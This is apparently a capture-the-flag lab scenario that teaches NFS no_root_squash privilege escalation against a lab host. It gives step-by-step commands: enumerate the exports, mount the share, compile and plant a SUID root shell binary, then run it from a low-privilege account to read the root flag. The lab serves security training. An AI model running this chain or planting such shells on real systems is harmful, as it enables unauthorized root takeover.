# Scenario 21 — NFS no_root_squash to root via SUID shell

**Difficulty:** 🟡 | **Time:** ~25 min | **Domains:** 02, 06, 13
**Tools:** [nmap](../../tools/nmap.md), `showmount`, `mount`

## Story
Target 10.10.10.21 exports an NFS share misconfigured with `no_root_squash`. Use it to drop a SUID shell and read `/root/flag.txt`.

## Step 1 — Find NFS service
```bash
nmap -sV -p 111,2049 10.10.10.21
```
**Expected finding:** `111/tcp open rpcbind`, `2049/tcp open nfs`.
**→ Tool ref:** [nmap port specification](../../tools/nmap.md#port-specification)

## Step 2 — List exports
```bash
showmount -e 10.10.10.21
```
**Expected finding:**
```
Export list for 10.10.10.21:
/srv/share  *
/home       10.0.0.0/8
```

## Step 3 — Mount the share locally
```bash
sudo mkdir /mnt/victim
sudo mount -t nfs 10.10.10.21:/srv/share /mnt/victim -o nolock
ls -la /mnt/victim
```
**Expected finding:** Files owned by root on the remote host, writable because you're mounting as root locally and `no_root_squash` is set.

## Step 4 — Compile a SUID shell
```bash
cat > /tmp/shell.c <<'EOF'
#include <stdio.h>
#include <unistd.h>
int main(){ setuid(0); setgid(0); execl("/bin/sh","sh","-p",NULL); }
EOF
gcc /tmp/shell.c -o /mnt/victim/pwn
sudo chown root:root /mnt/victim/pwn
sudo chmod 4755 /mnt/victim/pwn
```
**Expected finding:** SUID-root binary dropped on victim.

## Step 5 — Trigger from low-priv shell on target
**What we're doing:** SSH back in as a low-priv user and run the binary.
```bash
ssh lowuser@10.10.10.21
/srv/share/pwn
# id → uid=0(root)
cat /root/flag.txt
```

## Step 6 — Final answer
**Answer format:** flag string.

## Gotchas across this chain
- You need root on your attacking box to `mount` NFS and `chown` to root.
- If `no_root_squash` is NOT set, chown to root fails (`Operation not permitted`) — try `root_squash` workaround with a user-owned SUID if you can write as that user.
- Some targets mount exports `nosuid` — check `/proc/mounts` on victim; binary will fail to gain privs.
- NFSv4 may require `-t nfs4` and Kerberos.

## Variant questions this scenario teaches
- "What NFS shares are exported by 10.10.10.X?"
- "Which export is vulnerable to privesc?"
- "What does no_root_squash mean?"

